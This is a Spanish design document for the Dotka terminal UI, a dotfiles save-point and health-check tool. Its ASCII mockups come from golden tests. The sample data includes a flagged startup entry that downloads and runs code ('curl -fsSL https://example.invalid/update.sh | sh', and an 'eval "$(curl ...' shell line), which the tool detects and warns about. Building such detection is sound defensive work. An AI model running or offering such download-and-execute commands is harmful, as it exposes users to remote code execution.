# Dotka TUI — diseño de la interfaz

> Los mockups de este documento **son la salida real** de la TUI a 80x24.
> Salen de los golden tests (`internal/tui/testdata/*.txt`), así que no pueden
> desalinearse ni quedar desactualizados: si la interfaz cambia, los tests fallan
> hasta regenerarlos con `go test ./internal/tui -update`.

## 1. Objetivo y público

Usuarios **intermedios o algo novatos** de Linux (ricers de Hyprland): saben usar la
terminal, pero no tienen por qué saber qué es una entrada XDG autostart, una unidad de
systemd de usuario o un `exec-once`. La TUI responde a cinco preguntas, una por pestaña:

| Pestaña | Pregunta del usuario |
|---|---|
| 1 Overview | ¿Cómo estoy? ¿Cambió algo? ¿Hay algo mal? ¿Qué puedo hacer? |
| 2 Changes | ¿Qué cambió exactamente desde mi último punto de guardado? |
| 3 History | ¿Qué puntos de guardado tengo y a cuál puedo volver? |
| 4 Startup | ¿Qué se ejecuta solo cuando inicio sesión o abro una terminal? |
| 5 Health | ¿Hay algo roto o peligroso en mi configuración? |

Cómo abrirla: `dotka` (sin argumentos, en una terminal) o `dotka tui`. En un pipe o un
script, `dotka` sin argumentos sigue mostrando la ayuda.

## 2. Principios aplicados

- **Explicar, no solo listar.** El panel de detalle traduce cada cosa a lenguaje simple:
  `hypr-autostart` pasa a ser "Starts at login (Hyprland)", y un hallazgo de salud dice
  qué significa y qué hacer.
- **Solo ASCII.** Bordes `+ - |`, marcadores `> * [!] [?] [x] [-]`, sin emojis ni
  caracteres de dibujo, por coherencia con la CLI y para que se vea igual en una TTY.
- **El color nunca es el único portador de información.** Cada estado tiene símbolo o
  palabra (`+ ~ -`, `[!] downloads and runs code`). La selección usa `>` además del
  video inverso. Con `NO_COLOR` la TUI sigue siendo usable (verificado).
- **Paleta ANSI de 16 colores**: verde (añadido), amarillo (modificado/aviso), rojo
  (eliminado/riesgo), cian (foco) y gris (secundario). Sigue el tema claro u oscuro
  de la terminal del usuario.
- **Toda acción pide confirmación** y muestra antes qué va a pasar. Volver atrás siempre
  guarda el estado actual primero.
- **Seguro por defecto.** Sobre el home real (mientras Dotka sea prototipo) la TUI abre
  en **solo lectura** (`[read-only]`): se puede explorar todo, pero guardar o volver
  atrás está desactivado.

## 3. Estructura de la pantalla

```
linea 1      encabezado   dotka  <home>  [sandbox|read-only]      save point #N  X unsaved
linea 2      pestañas      1 Overview   2 Changes (X)   3 History (N)   4 Startup (N)   5 Health (N!)
linea 3      separador    ------------------------------------------------------------------
lineas 4..   cuerpo       Overview a ancho completo | lista + detalle | modal centrado
penúltima    estado       -- resultado de la última acción -------------------------------
última       atajos       teclas disponibles en este contexto
```

- **Lista + detalle**: la lista ocupa el 45 % del ancho (entre 32 y 60 columnas) y el
  detalle el resto. El panel con foco se marca con `>` en su título.
- **Tamaño mínimo: 70x20.** Por debajo se muestra un aviso, nunca una interfaz rota.
  Probado de 70x20 a 200x60 y con cambios de tamaño en vivo.
- Las rutas largas se recortan **por la izquierda** (`.../Dotka/.sandbox/home`), para que
  la etiqueta y el punto de guardado actual siempre se vean.

## 4. Pantallas

### 1 Overview — "¿cómo estoy?"

Resumen de cambios sin guardar (solo las filas con algo), estado de salud y **qué puede
hacer el usuario ahora**. Las acciones cambian según la situación: sin cambios, con
cambios, sin configurar o en solo lectura.

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
                                                                                
  Unsaved changes since save point #1 "initial state"  saved Nov 14 19:46       
                                                                                
    Files     +2   ~2   -0                                                      
    Packages  +3        -0                                                      
    Startup   +3        -1   [!] 1 new item(s) download and run code            
                                                                                
  Health                                                                        
    3 problems, 1 note   see tab 5                                              
                                                                                
  What you can do                                                               
    s save the current state as a new save point                                
    u discard these changes and go back to #1                                   
    2 review the changes one by one                                             
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
--------------------------------------------------------------------------------
 1-5 tabs   s save   u discard changes   r refresh   ? help   q quit            
```

### 2 Changes — "¿qué cambió?"

La lista agrupa en **Files / Packages / Runs at startup**. Las carpetas nuevas se pliegan
en una sola fila. El detalle explica qué pasaría al volver atrás y muestra el diff.

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
 > Unsaved changes                   | .config/hypr/hyprland.lua                
                                     |                                          
 Files (4)                           | Modified                                 
 > ~ .config/hypr/hyprland.lua       | Its content changed. Going back restores 
   ~ .config/kitty/kitty.conf [!]... | the saved version.                       
   + .config/waybar/ 2 files         |                                          
   + .local/bin/rice-autoupdate.sh   | --- saved                                
 Packages (3)                        | +++ now                                  
   + cava                            | @@ -1,3 +1,4 @@                          
   + swww                            |  hl.on("hyprland.start", function()      
   + waybar                          | -    hl.exec_cmd("qs -p ~/.config/quic...
 Runs at startup (4)                 | +    hl.exec_cmd("waybar")               
   +     waybar                      | +    hl.exec_cmd("swww-daemon")          
   + [?] ~/.local/bin/rice-autoup... |  end)                                    
   + [!] eval "$(curl -fsSL https... |                                          
   -     qs -p ~/.config/quickshe... |                                          
                                     |                                          
                                     |                                          
                                     |                                          
--------------------------------------------------------------------------------
 j/k move   tab detail   s save   u discard all   r refresh   ? help   q quit   
```

Al seleccionar algo que ahora se ejecuta (o dejó de ejecutarse) al iniciar:

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
 > Unsaved changes                   | Starts at login (Hyprland)               
                                     |                                          
 Files (4)                           | Removed: this no longer runs automatic...
   ~ .config/hypr/hyprland.lua       |                                          
   ~ .config/kitty/kitty.conf [!]... | Command                                  
   + .config/waybar/ 2 files         | qs -p ~/.config/quickshell/bar/shell.qml 
   + .local/bin/rice-autoupdate.sh   |                                          
 Packages (3)                        | What it is                               
   + cava                            | Hyprland starts this program once, when  
   + swww                            | you log in (inside                       
   + waybar                          | hl.on("hyprland.start") in your Lua      
 Runs at startup (4)                 | config).                                 
   +     waybar                      |                                          
   + [?] ~/.local/bin/rice-autoup... | Defined in                               
   + [!] eval "$(curl -fsSL https... | .config/hypr/hyprland.lua:5              
 > -     qs -p ~/.config/quickshe... |                                          
                                     |                                          
                                     |                                          
                                     |                                          
--------------------------------------------------------------------------------
 j/k move   tab detail   s save   u discard all   r refresh   ? help   q quit   
```

### 3 History — "mis puntos de guardado"

`*` marca el punto actual. El detalle dice cómo se creó (por ti, por `dotka run`, de
forma automática antes de volver atrás) y **qué pasaría si vuelves ahí**.

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
 > Save points (newest first)        | #2 super-rice                            
                                     |                                          
     #3   Nov 14 20:06  before ro... | Created   2026-11-14 19:56               
 >   #2   Nov 14 19:56  super-rice   | How       created by `dotka run` after   
   * #1   Nov 14 19:46  initial s... |           running:                       
                                     |           ./super-rice/install.sh        
                                     | Contains  2 files, 2 packages, 0 startup 
                                     |           items                          
                                     |                                          
                                     | Going back here would                    
                                     |   ~ revert 1 file                        
                                     |   - remove 3 newer files                 
                                     |                                          
                                     | b go back here   x forget this save point
                                     |                                          
                                     |                                          
                                     |                                          
                                     |                                          
                                     |                                          
--------------------------------------------------------------------------------
 j/k move   b go back here   x forget   r refresh   ? help   q quit             
```

### 4 Startup — "¿qué se ejecuta solo?"

Agrupado por origen. `[!]` descarga y ejecuta código, `[?]` ejecuta un script local.

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
 > Runs automatically                | Starts at login (Hyprland)               
                                     |                                          
 Hyprland (3)                        | Command                                  
       waybar                        | ~/.local/bin/rice-autoupdate.sh          
 > [?] ~/.local/bin/rice-autoupda... |                                          
       dunst                         | What it is                               
 User services (1)                   | Hyprland starts this program once, when  
   [?] rice-sync.service             | you log in (inside                       
 Shell (1)                           | hl.on("hyprland.start") in your Lua      
   [!] eval "$(curl -fsSL https:/... | config).                                 
                                     |                                          
                                     | Defined in                               
                                     | .config/hypr/hyprland.lua:6              
                                     |                                          
                                     | [?] Runs a local script                  
                                     | Note: it runs a script stored in your    
                                     | home. Read the script to know what it    
                                     | does (dotka doctor checks it for you).   
                                     |                                          
--------------------------------------------------------------------------------
 j/k move   tab detail   r refresh   ? help   q quit                            
```

### 5 Health — "¿algo está mal?"

Problemas `[x]` y notas `[-]`. Cada uno explica **qué significa** y **qué hacer**.

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
 > Health check                      | Startup script downloads code            
                                     |                                          
 Problems (3)                        | [x] Problem                              
 > [x] Startup script downloads c... | downloads and runs code at every login   
   [x] Missing program    hyprlan... | (started from                            
   [x] Secret readable by others ... | .config/hypr/hyprland.lua:6): curl -fsSL 
 Notes (1)                           | https://example.invalid/update.sh | sh   
   [-] Possible leftover  vesktop    |                                          
                                     | Where                                    
                                     | .local/bin/rice-autoupdate.sh:2          
                                     |                                          
                                     | What it means                            
                                     | A script that runs automatically         
                                     | downloads code from the internet and runs
                                     | it.                                      
                                     |                                          
                                     | What you can do                          
                                     | read the script; remove it from startup  
                                     | if you do not trust the source           
--------------------------------------------------------------------------------
 j/k move   tab detail   r refresh   ? help   q quit                            
```

## 5. Modales

**Volver atrás o descartar cambios.** Muestra el plan antes de tocar nada, y los
paquetes se sugieren, nunca se ejecutan:

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
    +----------------------------------------------------------------------+    
    | Discard unsaved changes (back to #1)?                                |    
    |                                                                      |    
    | Your current state is saved first, so this can be undone.            |    
    |                                                                      |    
    | Files                                                                |    
    |   ~ restore 1 file                                                   |    
    |   - remove 1 file added since then                                   |    
    |                                                                      |    
    | Runs at startup                                                      |    
    |   1 item will no longer run                                          |    
    |                                                                      |    
    | Packages                                                             |    
    | Dotka never changes packages. If you want, remove the ones installed |    
    | since then yourself:                                                 |    
    |   sudo pacman -Rns waybar swww                                       |    
    |                                                                      |    
    | y go back   n cancel                                                 |    
    +----------------------------------------------------------------------+    
--------------------------------------------------------------------------------
 y confirm   n cancel                                                           
```

**Guardar un punto** (dentro del campo de texto, `q` se escribe y no cierra la TUI):

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
                                                                                
                                                                                
                                                                                
                                                                                
    +----------------------------------------------------------------------+    
    | Save a point                                                         |    
    |                                                                      |    
    | Describe this save point (optional), for example: before trying X's  |    
    | dots                                                                 |    
    |                                                                      |    
    | > before_                                                            |    
    |                                                                      |    
    | enter save   esc cancel                                              |    
    +----------------------------------------------------------------------+    
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
--------------------------------------------------------------------------------
 enter save   esc cancel                                                        
```

**Ayuda (`?`):**

```
 dotka  .../proyectos/Dotka/.sandbox/home  [sandbox]  save point #1  11 unsaved 
  1 Overview   2 Changes (11)   3 History (3)   4 Startup (5)   5 Health (3!)   
--------------------------------------------------------------------------------
                                                                                
    +----------------------------------------------------------------------+    
    | Keys                                                                 |    
    |                                                                      |    
    | 1-5  left/right  switch tab                                          |    
    | j/k  up/down     move in the list (or scroll the detail)             |    
    | tab  enter       move between the list and the detail                |    
    | esc              back to the list / close                            |    
    | s                save the current state as a save point              |    
    | u                discard unsaved changes                             |    
    | b                History: go back to the selected save point         |    
    | x                History: forget the selected save point             |    
    | i                set dotka up (first time)                           |    
    | r                refresh                                             |    
    | q  ctrl+c        quit                                                |    
    |                                                                      |    
    | Every change asks first, and going back can always be undone.        |    
    +----------------------------------------------------------------------+    
                                                                                
--------------------------------------------------------------------------------
 any key close                                                                  
```

## 6. Estados especiales

**Primera vez, en el home real (solo lectura):**

```
 dotka  /home/u  [read-only]                                     not set up yet 
  1 Overview   2 Changes   3 History   4 Startup (5)   5 Health (3!)            
--------------------------------------------------------------------------------
                                                                                
  Welcome to dotka                                                              
  Dotka keeps save points of your Linux configuration. Before trying someone's  
  dotfiles, save a point; afterwards dotka shows exactly what changed (files,   
  packages, what runs at login) and lets you go back.                           
                                                                                
  This is your real home and dotka is still a prototype, so it is read-only     
  here. You can still explore tabs 4 (Startup) and 5 (Health).                  
                                                                                
  Health                                                                        
    3 problems, 1 note   see tab 5                                              
                                                                                
  What you can do                                                               
    4 see what runs automatically when you log in                               
    5 check your configuration for problems                                     
                                                                                
                                                                                
                                                                                
                                                                                
--------------------------------------------------------------------------------
 1-5 tabs   r refresh   ? help   q quit                                         
```

**Terminal demasiado pequeña:**

```
                                                  
                                                  
                                                  
                                                  
                Terminal too small                
                                                  
  dotka needs at least 70x20, this one is 50x15.  
     Make the window bigger, or use the dotka     
              commands (dotka help).              
                                                  
                      q quit                      
                                                  
                                                  
                                                  
                                                  
```

Además: **cargando** ("Scanning your home..."), **error** (mensaje + `r retry`), listas
vacías con un texto que explica por qué están vacías, y la línea de estado con el
resultado de cada acción (verde si fue bien, rojo si falló).

## 7. Teclas

| Tecla | Acción |
|---|---|
| `1`-`5`, `←`/`→`, `h`/`l` | Cambiar de pestaña |
| `j`/`k`, `↑`/`↓` | Moverse en la lista (o desplazar el detalle si tiene el foco) |
| `PgUp`/`PgDn`, `g`/`G` | Media página / inicio / final |
| `Tab`, `Enter` | Pasar de la lista al detalle (y volver con `Tab`) |
| `Esc` | Volver a la lista / cerrar |
| `s` | Guardar un punto (pide descripción opcional) |
| `u` | Descartar los cambios sin guardar (volver al punto actual) |
| `b` | History: volver al punto seleccionado |
| `x` | History: olvidar el punto seleccionado |
| `i` | Configurar Dotka la primera vez |
| `r` | Refrescar |
| `?` | Ayuda |
| `q`, `Ctrl+C` | Salir (`Ctrl+C` funciona siempre) |

El pie siempre muestra las teclas válidas en ese momento. Dentro de los modales cambia a
`y confirm / n cancel`, `enter save / esc cancel` o `any key close`.

## 8. Arquitectura

```
Backend (toda la E/S)  ->  tea.Cmd  ->  mensajes  ->  Update (estado puro)  ->  View (render puro)
```

| Archivo | Responsabilidad |
|---|---|
| `internal/tui/backend.go` | Interfaz `Backend` y `Real`: carga datos, diffs y acciones (snap, rollback, forget, init) |
| `model.go` | Estado, mensajes y comandos asíncronos |
| `update.go` | Teclas, navegación, modales y acciones (sin E/S) |
| `screens.go` | Filas de cada lista y contenido del detalle |
| `view.go` | Layout: encabezado, pestañas, cuerpo, modales, pie y estados especiales |
| `explain.go` | Textos en lenguaje simple |
| `theme.go` | Paleta y utilidades de ancho (truncado por ancho visible, no por bytes) |

Dependencias nuevas: `bubbletea` y `lipgloss`. No hace falta `bubbles`: los componentes
son pocos y simples.

## 9. Pruebas

- **Golden tests** de todas las pantallas a 80x24 (son los mockups de este documento).
- **Render a 70x20, 80x24, 120x40 y 200x60**, en cada pestaña, con foco en el detalle y
  con los modales abiertos: ninguna línea pasa del ancho y toda la salida es ASCII.
- **Interacción**: el cursor salta los encabezados; guardar se cancela con `Esc`; `q` se
  escribe dentro del campo de texto; volver atrás y olvidar exigen `y`; olvidar el punto
  actual se rechaza; en solo lectura no llega ninguna escritura al backend; el scroll
  mantiene el cursor visible; `Esc` seguido de una tecla (que algunas terminales envían
  como `Alt+tecla`) no pierde la tecla.
- **Backend real** contra un sandbox (`DOTKA_TUI_TEST_HOME=... go test ./internal/tui -run Real -v`).
- **Pty real**: arranque, navegación, guardado desde el modal, salida limpia (sale de la
  pantalla alternativa y restaura el cursor), cambio de tamaño por debajo del mínimo y
  vuelta atrás, y `NO_COLOR` sin ningún código de estilo.

## 10. Limitaciones conocidas

- Sin ratón (todo funciona con teclado).
- `dotka run` todavía no se puede lanzar desde la TUI: se usa desde la terminal y luego
  se revisa el resultado en la TUI.
- Al arrancar, Bubble Tea/termenv le pregunta a la terminal su color de fondo y usa una
  consulta de posición del cursor como "cerca". Las terminales reales responden al
  instante (incluida la consola TTY de Linux). En una terminal que no respondiera a
  ninguna de las dos, el arranque esperaría unos 5 segundos.
- Interfaz en inglés, como la CLI.
